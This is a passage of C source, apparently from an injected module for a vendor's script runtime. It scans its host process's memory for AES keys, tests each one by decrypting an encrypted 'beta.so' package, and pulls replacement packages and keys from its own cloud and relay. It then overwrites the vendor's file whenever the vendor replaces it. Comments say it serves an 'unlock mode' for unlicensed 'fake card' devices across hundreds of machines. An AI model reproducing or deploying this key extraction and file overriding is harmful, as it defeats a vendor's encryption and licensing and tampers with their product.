    size_t off = 0;
    while (off + 46 <= n) {
        unsigned char t = b[off];
        unsigned int nl, cl, ci;
        if (t == 0) {                                     // 元数据段: [usz u32][csz u32][raw zlib]
            unsigned int usz, csz;
            memcpy(&usz, b + off + 36, 4);
            memcpy(&csz, b + off + 40, 4);
            if (csz == 0 || csz > 30000000u) return 0;
            off += 44 + csz;
            continue;
        }
        memcpy(&nl, b + off + 36, 2);                     // u16 LE
        memcpy(&cl, b + off + 38, 4);                     // u32 LE
        memcpy(&ci, b + off + 42, 4);                     // u32 LE
        if (t == 2) {                                     // PNG 段: 头 42B
            if (nl < 4096 && cl > 0 && cl < 30000000u) {
                off += 42 + ((nl + cl + 15) / 16) * 16;
                continue;
            }
            return 0;
        }
        if (t == 1 && nl < 4096 && cl > 0 && cl < 30000000u && ci > 0 && ci <= 30000000u) {
            if (memcmp(b + off + 1, ver3, 3) == 0) {
                *ct = b + off + 46;
                *ci_out = ci; *nl_out = nl; *cl_out = cl;
                return 1;
            }
            off += 46 + ((ci + 15) / 16) * 16;
            continue;
        }
        return 0;                                         // 链坏 -> 放弃
    }
    return 0;
}

/// 候选密钥验证。粗筛（首块 zlib 头）永远做；精验（整段解密+解压+name 可打印）
/// 只在粗筛通过时做。命中返回 1 并把 32B 密钥拷进 outkey。
static int kh_test_key(const unsigned char *key, const unsigned char *seg,
                       unsigned int ci, unsigned int nl, unsigned int cl,
                       unsigned char *outkey) {
    unsigned int rk[KH_RK_WORDS];
    unsigned char b0[16];
    kh_expand(key, rk);
    kh_dec_block(rk, seg, b0);
    if (b0[0] != 0x78) return 0;                          // zlib CMF
    if ((((unsigned)b0[0] << 8) | b0[1]) % 31 != 0) return 0;   // FCHECK
    if (!kh_cdec) return 0;
    unsigned int pad = (ci + 15) / 16 * 16;
    unsigned char *full = (unsigned char *)malloc(pad);
    if (!full) return 0;
    for (unsigned int o = 0; o < pad; o += 16)
        kh_dec_block(rk, seg + o, full + o);
    unsigned char *dst = (unsigned char *)malloc((size_t)nl + cl);
    int okv = 0;
    if (dst) {
        size_t got = kh_cdec(dst, (size_t)nl + cl, full + 2, pad - 2, NULL,
                             0x200 /* COMPRESSION_ZLIB（原始 deflate）*/);
        if (got == (size_t)nl + cl) {
            int printable = 1;                            // 段名必须可打印（伪命中兜底）
            for (unsigned int i = 0; i < nl; i++)
                if (dst[i] < 0x20 || dst[i] > 0x7e) { printable = 0; break; }
            if (printable) { memcpy(outkey, key, 32); okv = 1; }
        }
        free(dst);
    }
    free(full);
    return okv;
}

/// 单块缓冲扫描：pass1 = 64 连 hex 文本串；pass2 = 4 字节对齐原始 32B 窗口。
static int kh_scan_buf(const unsigned char *buf, size_t n,
                       const unsigned char *seg, unsigned int ci,
                       unsigned int nl, unsigned int cl,
                       unsigned char *outkey, unsigned long long *tried) {
    size_t i = 0;                                         // pass1: hex 文本
    while (i + 64 <= n) {
        if (isxdigit((int)buf[i])) {
            size_t j = i;
            while (j < n && isxdigit((int)buf[j])) j++;
            if (j - i >= 64) {
                for (size_t s0 = i; s0 + 64 <= j; s0++) {
                    unsigned char k[32];
                    int bad = 0;
                    for (int q = 0; q < 32; q++) {
                        unsigned char a = buf[s0 + 2*q], b2 = buf[s0 + 2*q + 1];
                        int hi = (a <= '9') ? (a - '0') : ((a | 0x20) - 'a' + 10);
                        int lo = (b2 <= '9') ? (b2 - '0') : ((b2 | 0x20) - 'a' + 10);
                        if (hi > 15 || lo > 15) { bad = 1; break; }
                        k[q] = (unsigned char)((hi << 4) | lo);
                    }
                    (*tried)++;
                    if (!bad && kh_test_key(k, seg, ci, nl, cl, outkey)) return 1;
                }
            }
            i = j;
        } else i++;
    }
    for (size_t off = 0; off + 32 <= n; off += 4) {       // pass2: 原始窗口
        (*tried)++;
        if (kh_test_key(buf + off, seg, ci, nl, cl, outkey)) return 1;
    }
    return 0;
}

/// keyhunt 主入口：返回 1 = 找到（outkey 32B），0 = 没找到/功能不可用。
static int kh_keyhunt(const unsigned char *ver3, unsigned char *outkey) {
    kh_init();
    if (!kh_selftest()) {
        bs_log("[keyhunt] AES selftest FAIL -> keyhunt disabled");
        return 0;
    }
    kh_load_cdec();
    if (!kh_cdec) {
        bs_log("[keyhunt] libcompression unavailable -> keyhunt disabled");
        return 0;
    }
    unsigned char *so = NULL;
    size_t solen = 0;
    if (!bs_read_file(DATA_DIR "/beta.so", &so, &solen)) {
        bs_log("[keyhunt] read beta.so failed errno=%d", errno);
        return 0;
    }
    const unsigned char *seg = NULL;
    unsigned int ci = 0, nl = 0, cl = 0;
    int have = kh_pick_ct(so, solen, ver3, &seg, &ci, &nl, &cl);
    if (!have) {
        free(so);
        bs_log("[keyhunt] beta.so has no type=1 seg ver=%02x%02x%02x",
               ver3[0], ver3[1], ver3[2]);
        return 0;
    }
    mach_port_t task = mach_task_self();
    mach_vm_address_t addr = 0x1000;
    unsigned long long tried = 0;
    int found = 0;
    while (!found) {
        mach_vm_size_t rsize = 0;
        vm_region_basic_info_data_64_t info;
        mach_msg_type_number_t icnt = VM_REGION_BASIC_INFO_COUNT_64;
        mach_port_t obj = MACH_PORT_NULL;
        kern_return_t kr = mach_vm_region(task, &addr, &rsize, VM_REGION_BASIC_INFO_64,
                                          (vm_region_info_t)&info, &icnt, &obj);
        if (kr != KERN_SUCCESS) break;
        if (obj != MACH_PORT_NULL) mach_port_deallocate(task, obj);
        if (info.protection & VM_PROT_READ) {
            mach_vm_address_t p = addr;
            mach_vm_size_t left = rsize;
            while (!found && left > 0) {
                mach_vm_size_t want = left > sizeof(kh_chunk) ? sizeof(kh_chunk) : left;
                mach_vm_size_t got = 0;
                kr = mach_vm_read_overwrite(task, p, want,
                        (mach_vm_address_t)(uintptr_t)kh_chunk, &got);
                if (kr != KERN_SUCCESS || got == 0) break;
                found = kh_scan_buf(kh_chunk, (size_t)got, seg, ci, nl, cl,
                                    outkey, &tried);
                p += got;
                left -= got;
            }
        }
        addr += rsize;
        if (addr < 0x1000) break;                         // 地址回绕防呆
    }
    free(so);
    bs_log("[keyhunt] scan done tried=%llu found=%d", tried, found);
    return found;
}

// ================================================================
// ★★★ v6.6：主动跟版（解锁模式专用）
//
//   目的：假卡机不依赖官方 server2 通道，也能从**我们自己的云端**取到新 beta.so。
//   链路：GET /ver?prj=sjz  →（云端版本 > 本地 && 云端有该版本密钥）→
//         GET /script/beta.so?ver=<新版本> → 校验 → 原子落盘。
//   落盘后由 bs_verwatch（3s）自动补该版本密钥（v6.5）。
//   ⚠️ 脚本不热加载：包到位 ≠ 立即在跑，仍需一次重开 App。
// ================================================================

/// 原子写文件：同目录 .sync.tmp → 写满 → fsync → rename 覆盖。
///   ★ 绝不用 O_TRUNC 直接写目标文件：那样在写入途中崩溃/被杀会留下半个 beta.so，
///     脚本加载器读到残包可能直接崩。rename 是原子的，最差是保留旧文件。
static int bs_write_file_atomic(const char *path, const unsigned char *buf, size_t len) {
    char tmp[512];
    snprintf(tmp, sizeof(tmp), "%s.sync.tmp", path);
    int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        bs_log("[so] open tmp failed errno=%d", errno);
        return 0;
    }
    size_t off = 0;
    while (off < len) {
        ssize_t w = write(fd, buf + off, len - off);
        if (w <= 0) break;
        off += (size_t)w;
    }
    if (off == len) fsync(fd);
    close(fd);
    if (off != len) {
        bs_log("[so] write short %lu/%lu errno=%d", (unsigned long)off,
               (unsigned long)len, errno);
        unlink(tmp);
        return 0;
    }
    if (rename(tmp, path) != 0) {
        bs_log("[so] rename failed errno=%d", errno);
        unlink(tmp);
        return 0;
    }
    return 1;
}

/// 从服务端 JSON 里抠出 "ver" 的 6 位小写 hex 值（纯 C，不碰 NSJSONSerialization）。
///   ★ 必须精确匹配键名 "ver"（键后紧跟引号）——否则会误抓 "ver_dot": "3.0.0"。
///   ★ 服务端 json.dumps 默认带空格，所以冒号两侧空白都要容忍。
static int bs_json_pick_ver(const unsigned char *j, size_t n, char *out, size_t outsz) {
    if (!out || outsz < 7) return 0;
    for (size_t i = 0; i + 5 < n; i++) {
        if (j[i] != '"') continue;
        if (memcmp(j + i + 1, "ver", 3) != 0) continue;
        if (j[i + 4] != '"') continue;               // 排除 "ver_dot" / "verbose"
        size_t k = i + 5;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != ':') continue;
        k++;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != '"') continue;
        k++;
        int ok = 1;
        for (int t = 0; t < 6; t++) {
            char c = (k + (size_t)t < n) ? (char)j[k + t] : 0;
            if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) { ok = 0; break; }
            out[t] = c;
        }
        if (!ok) continue;                            // 例如 ver_dot 的 "3.0.0" 会在这被拒
        out[6] = 0;
        return 1;
    }
    return 0;
}

/// 在 JSON 里找 "<key>": true（纯 C）。用于 has_key —— 云端没该版本密钥就不该拉包。
static int bs_json_has_true(const unsigned char *j, size_t n, const char *key) {
    size_t kl = strlen(key);
    for (size_t i = 0; i + kl + 3 < n; i++) {
        if (j[i] != '"') continue;
        if (memcmp(j + i + 1, key, kl) != 0) continue;
        if (j[i + 1 + kl] != '"') continue;
        size_t k = i + 2 + kl;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != ':') continue;
        k++;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        return (k + 4 <= n && memcmp(j + k, "true", 4) == 0) ? 1 : 0;
    }
    return 0;
}

/// ★ v6.23o：从服务端 JSON 里抠 "<key>": "<字符串值>"（纯 C）。
///   用于 /ver 应答的 "md5" 字段（script_latest 早就返回了，一直没人用）。
///   语义同 bs_json_pick_ver：键名精确匹配（前后引号），容忍冒号两侧空白。
///   值最多写 outsz-1 字节；成功返回 1。
static int bs_json_pick_str(const unsigned char *j, size_t n, const char *key,
                            char *out, size_t outsz) {
    if (!out || outsz < 2) return 0;
    size_t kl = strlen(key);
    for (size_t i = 0; i + kl + 3 < n; i++) {
        if (j[i] != '"') continue;
        if (memcmp(j + i + 1, key, kl) != 0) continue;
        if (j[i + 1 + kl] != '"') continue;          // 键名必须整段命中
        size_t k = i + 2 + kl;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != ':') continue;
        k++;
        while (k < n && (j[k] == ' ' || j[k] == '\t')) k++;
        if (k >= n || j[k] != '"') continue;
        k++;
        size_t t = 0;
        while (k < n && j[k] != '"' && j[k] != '\n') {
            if (t + 1 < outsz) out[t++] = (char)j[k];
            k++;
        }
        if (k >= n || j[k] != '"') continue;         // 没闭合引号 = 不是干净字符串
        out[t] = 0;
        return 1;
    }
    return 0;
}

/// ★ v6.23n：beta.so 下载统一走这里（中继优先 → 云端回退 → 体积校验）。
///   原 bs_so_sync_once 内联逻辑抽出，容器修复（v6.23n）复用同一条路。
///   成功返回缓冲（调用方 free）并写 *outn；失败返回 NULL。
static unsigned char *bs_dl_beta_relay(const char *ip, int port,
                                       const char *ver, size_t *outn) {
    // ★ v6.9→v6.13：下载走局域网中继（app.plist 中控 ip，每次现读）；
    //   conf sohost 仅应急覆盖；app.plist 缺失 → 直连云端。
    char appip_now[64];
    bs_pc_ip_of_plist(appip_now, sizeof(appip_now));
    const char *dip;
    int dport;
    if (g_sohost[0]) {
        dip = g_sohost;
        dport = (g_soport > 0) ? g_soport : port;
        bs_log("[so] download via relay %s:%d (conf sohost)", dip, dport);
    } else if (appip_now[0]) {
        dip = appip_now;
        dport = (g_soport > 0) ? g_soport : SO_PORT_DEF;
        bs_log("[so] download via relay %s:%d (app.plist)", dip, dport);
    } else {
        dip = ip;
        dport = port;
    }
    char surl[512];
    if (g_token[0])
        snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s&key=%s",
                 dip, dport, ver, g_token);
    else
        snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s",
                 dip, dport, ver);

    // ★ v6.8：大文件下载必须长超时；★ v6.12：中继失败自动回退直连云端
    size_t sn = 0;
    unsigned char *so = bs_http_get_ex_tmo(surl, &sn, NULL, SO_DL_TMO_REQ, SO_DL_TMO_RES);
    if (dip != ip && (!so || sn < SO_MIN_BYTES || sn > SO_MAX_BYTES)) {
        bs_log("[so] relay %s:%d failed (got %lu B) -> retry cloud %s:%d",
               dip, dport, (unsigned long)sn, ip, port);
        if (so) { free(so); so = NULL; }
        if (g_token[0])
            snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s&key=%s",
                     ip, port, ver, g_token);
        else
            snprintf(surl, sizeof(surl), "http://%s:%d/script/beta.so?ver=%s",
                     ip, port, ver);
        so = bs_http_get_ex_tmo(surl, &sn, NULL, SO_DL_TMO_REQ, SO_DL_TMO_RES);
    }
    if (!so || sn < SO_MIN_BYTES || sn > SO_MAX_BYTES) {
        bs_log("[so] bad size %lu (min=%lu max=%lu) -> abort",
               (unsigned long)sn, (unsigned long)SO_MIN_BYTES,
               (unsigned long)SO_MAX_BYTES);
        if (so) { free(so); so = NULL; }
        return NULL;
    }
    *outn = sn;
    return so;
}

/// ★ v6.23n：beta.so 落盘成功后的处理 —— ★ v6.24q：自动重启彻底移除（用户指令：
///   新 so 只落盘，脚本下次手动运行时自然加载；verwatch 按盘上版本预铺密钥，
///   手动运行即可解开新包）。
/// ★ v6.24r：首次运行/bootstrap —— 状态文件不存在时，用盘上现有 beta.so 的
///   md5 建基线（pend=0，视为「当前盘上的包就是内存里/下次会加载的包」）。
///   动机：全网 495 台里绝大多数不会在本次换包后立刻有动作，若状态缺失就一直
///   显示 so=unknown；补基线后远程能直接读到「这台盘上是 842cabc4 还是 c2ead84e」。
static void bs_so_state_bootstrap(void) {
    if (bs_so_state_read(NULL, 0, NULL, NULL, NULL, NULL)) return;
    FILE *f = fopen(DATA_DIR "/beta.so", "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0 || sz > (8L << 20)) { fclose(f); return; }
    unsigned char *b = (unsigned char *)malloc((size_t)sz);
    if (!b) { fclose(f); return; }
    size_t rn = fread(b, 1, (size_t)sz, f);
    fclose(f);
    if (rn == (size_t)sz) {
        char md5[40] = {0};
        bs_md5_buf(b, rn, md5, sizeof(md5));
        bs_so_state_write(0, md5, sz);
        bs_evt("[so] state bootstrap: on-disk md5=%s size=%ld -> pend=0", md5, sz);
    }
    free(b);
}

static void bs_so_maybe_reload(const char *verhex, const unsigned char *buf, size_t n) {
    (void)verhex;
    char md5[40] = {0};
    if (buf && n) bs_md5_buf(buf, n, md5, sizeof(md5));
    // ★ v6.24r：落盘即打 pend=1 —— 远程一眼看出「盘上新的、内存旧的」
    bs_so_state_write(1, md5, (long)n);
    bs_evt("[so] new so on disk -> pend=1 (loads on next script start; md5=%s size=%lu)",
           md5, (unsigned long)n);
}

// ★★★ v6.23n：脏容器自愈（外网机 nm=1005「加载运行库出错」实锤驱动）。
//   厂商通道会给 App 拉到捆了无键远古段的变体容器（12 段 7 无键），
//   App 加载运行库解密失败；云端 probe 分发的同版本号包是干净的，
//   尺寸可能相同 → so_sync 只升不降永远不触发。这里在「版本一致」时
//   主动体检：逐段查键（字典已有零开销；缺 → 云端 /key bypass 现查），
//   存在字典+云端都无键的段 = 永久解不开 → 按当前版本号重拉覆盖。
#define SO_REPAIR_COOL_OK       600    // ★ v6.30：成功后短冷却（原 3600 太长，实测空窗 1h）
#define SO_REPAIR_COOL_THROTTLE 3600   // ★ v6.30：窗口内超额后的节流冷却
#define SO_REPAIR_WIN          3600    // ★ v6.30：成功修复的滚动窗口
#define SO_REPAIR_BUDGET          3    // ★ v6.30：窗口内允许的「短冷却」修复次数
#define SO_REPAIR_RETRY          60    // ★ v6.29：失败后的短冷却
static time_t g_so_repair_last = 0;
static int    g_so_repair_cd   = SO_REPAIR_RETRY;   // 当前生效的冷却档位
static time_t g_so_repair_win  = 0;                 // ★ v6.30：预算窗口起点
static int    g_so_repair_ok   = 0;                 // ★ v6.30：窗口内成功修复次数

/// 两个 32 位 hex 串大小写不敏感比较（云端 json 小写，本地自实现 md5 也小写，
/// 保险起见仍按不敏感比）。相等返回 0。
static int bs_hexieq(const char *a, const char *b) {
    for (int i = 0; i < 32; i++) {
        char ca = a[i], cb = b[i];
        if (ca >= 'A' && ca <= 'F') ca += 32;
        if (cb >= 'A' && cb <= 'F') cb += 32;
        if (ca != cb) return 1;
        if (!ca) return 0;
    }
    return 0;
}

/// ★ v6.23o：按版本号重拉干净包并落盘（容器修复的唯一执行体）。
///   want_md5 非空时 = md5 强制模式（v6.23o）：下载体 md5 必须命中云端 /ver
///   报的值才落盘 —— 防止中继缓存陈旧包与云端来回打架。
///   冷却在入口统一判（成功/干净由调用方复位）。
/// ★ v6.29：repair 冷却两档 —— 失败 60s / 成功 3600s。
///   旧写法（v6.23o~v6.28）在**下载之前**就打 `g_so_repair_last = now`，而后面
///   三条失败分支（download failed / md5 != cloud / 键不到位）都不撤销这个点，
///   只有写入成功才清。后果（2026-10-21 19:48 全网事故实锤）：
///     云端换 fix5 的那一刻，全网 120s tick 同时触发 repair，中控 relay 还缓存
///     着旧包 → md5 闸门 abort → 600+ 台一次性锁死 3600s，锁到 20:48，
///     只有 239 台抢在前面拿到。中继慢、弱网抖动、密钥晚到都会重演同一幕。
///   现在：入口先按「失败」记档（60s），只有 bs_write_file_atomic 成功才转长冷却。
/// ★ v6.30：成功档从「无条件 3600s」改为「600s + 滚动预算」——
///   v6.29 在 216 上实测出空窗：21:38:47 修好 → 21:40:47 又被换坏 →
///   mismatch 打了日志却被 3600 冷却 return，盘上坏包要挂满 1 小时。
///   现在 1h 窗口内前 3 次成功修复冷却 600s，超额才退 3600s 节流。
static void bs_so_repair_pull(const char *ip, int port, const char *verhex,
                              const char *want_md5) {
    time_t now = time(NULL);
    if (g_so_repair_last && now - g_so_repair_last < g_so_repair_cd) return;
    g_so_repair_last = now;
    g_so_repair_cd   = SO_REPAIR_RETRY;          // ★ v6.29：先按失败算档

    size_t sn = 0;
    unsigned char *so = bs_dl_beta_relay(ip, port, verhex, &sn);
    if (!so) {
        bs_log("[so] repair: download failed -> keep local, retry in %ds",
               SO_REPAIR_RETRY);
        return;
    }

    // ★ 防错版：包头 [类型 1B][版本 3B] 必须等于请求版本
    unsigned char want[3];
    bs_hex3(verhex, want);
    if (memcmp(so + 1, want, 3) != 0) {
        bs_log("[so] repair: header ver mismatch (%02x%02x%02x != %s) -> abort",
               so[1], so[2], so[3], verhex);
        free(so);
        return;
    }

    // ★ v6.23o md5 闸门：下载体必须和云端 /ver 报的 md5 一致
    if (want_md5 && want_md5[0]) {
        char got[36];
        bs_md5_buf(so, sn, got, sizeof(got));
        if (bs_hexieq(got, want_md5) != 0) {
            bs_log("[so] repair: download md5 %s != cloud %s -> abort (relay stale?)",
                   got, want_md5);
            free(so);
            return;
        }
        bs_log("[so] repair: download md5 verified (%s)", got);
    }

    // 键闸门（v6.18 同款）：新包逐版本 ensure，任何一把不到手就不落盘
    //   —— 云端包若同样捆了无键段，宁可保留现场也不切换。
    unsigned char gv[EK_VERS_MAX][3];
    int gvn = bs_scan_so_vers(so, sn, gv, EK_VERS_MAX);
    if (gvn > 0) {
        for (int i = 0; i < gvn; i++) {
            char vh[8];
            snprintf(vh, sizeof(vh), "%02x%02x%02x", gv[i][0], gv[i][1], gv[i][2]);
            if (!bs_ensure_extra_key(g_base, vh, 1)) {
                bs_log("[so] repair gate: key %s unavailable (cloud pkg dirty too?) -> keep local", vh);
                free(so);
                return;
            }
        }
    }

    if (bs_write_file_atomic(DATA_DIR "/beta.so", so, sn)) {
        if (want_md5 && want_md5[0])
            bs_evt("[so] ★★ container repaired (md5 verified): clean ver=%s (%lu B) written",
                   verhex, (unsigned long)sn);
        else
            bs_evt("[so] ★★ container repaired: clean ver=%s (%lu B) written",
                   verhex, (unsigned long)sn);
        // ★ v6.30：成功后按「滚动预算」定档 —— 而不是无条件锁 1h。
        //   原因（216 实测）：v6.29 成功后一律 3600s，21:38:47 修好、21:40:47 厂商
        //   又把包换坏，mismatch 检测到了却因冷却直接 return，空窗整 1 小时。
        //   新规则：1h 窗口内前 3 次成功修复只冷却 600s（10 分钟一检，够快），
        //   超额（= 厂商在反复换包）才退到 3600s 节流，保住带宽不被打爆。
        if (g_so_repair_win == 0 || now - g_so_repair_win >= SO_REPAIR_WIN) {
            g_so_repair_win = now;
            g_so_repair_ok  = 0;
        }
        g_so_repair_ok++;
        g_so_repair_last = now;
        g_so_repair_cd   = (g_so_repair_ok > SO_REPAIR_BUDGET)
                           ? SO_REPAIR_COOL_THROTTLE : SO_REPAIR_COOL_OK;
        bs_evt("[so] repair cooldown -> %ds (ok=%d in %ds window)",
               g_so_repair_cd, g_so_repair_ok, SO_REPAIR_WIN);
        bs_so_maybe_reload(verhex, so, sn);
    }
    free(so);
}

static void bs_so_repair_if_dirty(const char *ip, int port, const char *verhex) {
    if (!g_base) return;
    int nv = bs_refresh_so_vers();               // 文件没变走缓存，零 IO
    if (nv <= 0) return;

    // 体检：每个段版本确保有键。① 字典已有 → 1（零开销，verwatch 早已注入）
    // ② 缺 → 云端 /key 现查并顺手注入（bypass=1 必须新鲜结论）
    int still = 0, total = 0;
    char first_missing[8] = "?";
    for (int i = 0; i < nv; i++) {
        char vh[8];
        snprintf(vh, sizeof(vh), "%02x%02x%02x",
                 g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
        total++;
        if (!bs_ensure_extra_key(g_base, vh, 1)) {
            if (still == 0) snprintf(first_missing, sizeof(first_missing), "%s", vh);
            still++;
        }
    }
    if (still == 0) {                            // 全键：干净（含刚补齐/刚修好）
        g_so_repair_last = 0;
        return;
    }

    bs_evt("[so] ★ dirty container: %d/%d vers keyless (first=%s, cloud 404) -> repair pull ver=%s",
           still, total, first_missing, verhex);
    bs_so_repair_pull(ip, port, verhex, NULL);
}

/// 单轮跟版检查。无变化/够不着云端时静默返回（只在真正动作时打日志）。
static void bs_so_sync_once(void) {
    char lver[8] = {0};
    int have_local = bs_read_beta_ver(lver, sizeof(lver));
    // ★★★ v6.38：本地 beta.so 读不到（缺失/权限/视图差异）**不再直接放弃**。
    //   旧写法是 `return`，于是设备进入「自愈真空」：
    //     厂商 App 在「停止 → 运行」时会重建本地运行库（snail module），
    //     若那次重建失败/被清掉，盘上就再也没有 beta.so；
    //     而 bs_refresh_so_vers() 又把版本集合清零 ⇒ verwatch 一把版本键都不补
    //     ⇒ 脚本一重启就 `load snail module failed`（中控显示「加载运行库出错」）。
    //   10-23 实测：14:13 新装的那批 34 台**全部**处于该状态（0 台有过一次成功的
    //   盘上扫描），其中 1055(f7d0d6ee)/1056(56b5542c) 中控点运行当场报错。
    //   现在：读不到就按「无本地包」处理 —— 直接向云端要正式包、过键闸门、落盘，
    //   落盘后立刻重扫版本集合并补齐全部版本键。
    if (!have_local)
        bs_evt("[so] local beta.so MISSING/unreadable -> force full sync (self-heal)");
    char ip[128] = {0};
    if (!bs_get_host_c(ip, sizeof(ip))) {
        bs_log("[so] no host -> skip sync");
        return;
    }

    char url[512];
    if (g_token[0])
        snprintf(url, sizeof(url), "http://%s:%d%s?prj=%s&key=%s",
                 ip, g_port, SO_VER_PATH, BS_PRJ, g_token);
    else
        snprintf(url, sizeof(url), "http://%s:%d%s?prj=%s",
                 ip, g_port, SO_VER_PATH, BS_PRJ);

    size_t n = 0;
    unsigned char *b = bs_http_get_c(url, &n);
    if (!b || n == 0) { if (b) free(b); return; }     // 连不上就等下一轮，不刷日志

    char cver[8] = {0};
    int have_ver = bs_json_pick_ver(b, n, cver, sizeof(cver));
    int has_key  = bs_json_has_true(b, n, "has_key");
    // ★ v6.23o：顺手抓云端报的容器 md5（必须在 free(b) 前）
    char wmd5[36] = {0};
    int have_md5 = bs_json_pick_str(b, n, "md5", wmd5, sizeof(wmd5));
    free(b);

    if (!have_ver) { bs_log("[so] /ver parse failed -> skip"); return; }

    // ★ v6.38：无本地包 → 跳过全部「版本比对」分支，直接进下载（仍走 has_key 闸门）。
    //   这是「加载运行库出错」唯一能自动恢复的路径，绝不能因为读不到本地版本就退出。
    if (!have_local) {
        if (!has_key) {
            bs_evt("[so] cloud %s has NO key yet -> self-heal blocked, wait", cver);
            return;
        }
        bs_evt("[so] ★ self-heal: no local beta.so -> download ver=%s (%s)",
               cver, wmd5[0] ? wmd5 : "no-md5");
        goto SO_DL;
    }
    if (strcmp(cver, lver) == 0) {                    // 已是最新
        // ★ v6.23o：md5 强制比对 —— 厂商通道/App 会在同版本号下整包换载荷
        //   （1005 实锤：人工覆盖干净包 2h 内又被换回变体；变体可全键但
        //   lua 内容坏，键体检抓不住）。云端 /ver 自带 md5，本地不符 = 被换包
        //   → 按 md5 重拉（下载体也要 md5 命中才落盘）。
        if (have_md5 && wmd5[0]) {
            char lmd5[36] = {0};
            if (bs_md5_file(DATA_DIR "/beta.so", lmd5, sizeof(lmd5)) &&
                bs_hexieq(lmd5, wmd5) != 0) {
                bs_evt("[so] ★ md5 mismatch: local %s != cloud %s -> repair pull ver=%s",
                       lmd5, wmd5, cver);
                bs_so_repair_pull(ip, g_port, cver, wmd5);
                return;
            }
        }
        // ★ v6.23n：版本一致也要验容器健康 —— 厂商通道可能给 App 拉到捆了
        //   无键远古段的「脏容器」（1005 实锤），尺寸与云端干净包相同时
        //   so_sync「只升不降」永远不触发，必须在这里主动体检+自愈。
        bs_so_repair_if_dirty(ip, g_port, cver);
        return;
    }
    if (strcmp(cver, lver) < 0) {                     // 只升不降
        bs_log("[so] cloud %s < local %s -> keep local", cver, lver);
        return;
    }
    if (!has_key) {
        // ★ 云端有包但密钥还没上架：拉了也解不开，等人工/真卡机把密钥补上
        bs_log("[so] cloud %s has NO key yet -> wait", cver);
        return;
    }

SO_DL:
    bs_evt("[so] cloud %s > local %s -> downloading", cver,
           have_local ? lver : "(none)");
    // ★ v6.23n：下载逻辑抽到 bs_dl_beta_relay（中继优先→云端回退→体积校验），
    //   与容器修复共用同一条路；app.plist 现读/sohost 覆盖/长超时都在 helper 里。
    size_t sn = 0;
    unsigned char *so = bs_dl_beta_relay(ip, g_port, cver, &sn);
    if (!so) return;

    // ★ 防错版：包头是 [类型 1B][版本 3B]，版本必须等于我们请求的版本
    unsigned char want[3];
    bs_hex3(cver, want);
    if (memcmp(so + 1, want, 3) != 0) {
        bs_log("[so] header ver mismatch (%02x%02x%02x != %s) -> abort",
               so[1], so[2], so[3], cver);
        free(so);
        return;
    }

    // ★★★ v6.18：键闸门 —— 新包段流里每个版本键都必须先到手才允许落盘切版。
    //   3.0.5 教训：云端 /ver 报 has_key 只看**头版本**键；包内 lua 记录自带
    //   030002~030005 各版本键，切了包键没到 → `can not find version key!!`
    //   → 脚本起不来，还得人工回滚。现在：逐版本 ensure（取到即顺手注入预热），
    //   任何一把 MISS → 不落盘、保持旧包，等 sotick 下一轮重试。
    //   扫描结果为 0（格式异常游走失败）→ 保守放行（打警告），行为退回 v6.17。
    unsigned char gv[EK_VERS_MAX][3];
    int gvn = bs_scan_so_vers(so, sn, gv, EK_VERS_MAX);
    if (gvn == 0) {
        bs_log("[so] WARN: scan new beta.so got 0 vers (format changed?) -> gate pass-through");
    } else {
        int gate_ok = 1;
        for (int i = 0; i < gvn && gate_ok; i++) {
            char vh[8];
            snprintf(vh, sizeof(vh), "%02x%02x%02x", gv[i][0], gv[i][1], gv[i][2]);
            // base=g_base：取到键直接注入预热；g_base 尚无（极早期）也允许只验云端
            if (!bs_ensure_extra_key(g_base, vh, 1)) {
                bs_log("[so] gate: key %s not available -> keep local %s, retry next tick",
                       vh, lver);
                gate_ok = 0;
            }
        }
        if (!gate_ok) { free(so); return; }
        if (gvn > 2)
            bs_log("[so] gate passed: %d vers all keyed", gvn);
    }

    if (bs_write_file_atomic(DATA_DIR "/beta.so", so, sn)) {
        bs_evt("[so] ★ beta.so updated %s -> %s (%lu B)",
               have_local ? lver : "(none)", cver, (unsigned long)sn);
        // ★ v6.38：落盘后立刻重扫版本集合并补齐每把版本键。
        //   理由：键字典是「进程内内存态」，脚本一重启就要重新解密；若此刻盘上
        //   文件刚换、verwatch 还没来得及扫（或扫描被打断），下一次「运行」就会
        //   `load snail module failed`。这里当场补完，等于把窗口压到 0。
        g_ek_scan_size = -1;                      // 使缓存失效，强制重扫
        int nv2 = bs_refresh_so_vers();
        int keyed = 0;
        for (int i = 0; i < nv2; i++) {
            char vh[8];
            snprintf(vh, sizeof(vh), "%02x%02x%02x",
                     g_ek_vers[i][0], g_ek_vers[i][1], g_ek_vers[i][2]);
            if (bs_ensure_extra_key(g_base, vh, 1)) keyed++;
        }
        if (nv2 > 0)
            bs_evt("[so] post-write keys ready: %d/%d vers keyed", keyed, nv2);
        // ★ v6.7 在跑→重启 / 没在跑→只落盘；v6.23n 抽到 bs_so_maybe_reload 复用
        bs_so_maybe_reload(cver, so, sn);
    }
    free(so);
}

/// 跟版线程：首轮延迟 20s（等 App 网络栈就绪），之后每 g_so_tick 秒复查一次。
static void *bs_so_sync_thread(void *arg) {
    (void)arg;
    bs_evt("[so] sync thread start tick=%ds sosync=%d host=%s:%d",
           g_so_tick, g_so_sync, g_host, g_port);
    sleep(SO_SYNC_FIRST_DELAY);
    for (;;) {
        if (g_so_sync) bs_so_sync_once();
        sleep((unsigned)g_so_tick);
    }
    return NULL;
}

/// probe 线程：版本 → 密钥 → 组帧 → POST /probe。
///   幂等设计：与上次成功上报同版本则本轮静默（不重复传 1MB 包）。
static void *bs_probe_thread(void *arg) {
    uintptr_t base = (uintptr_t)arg;
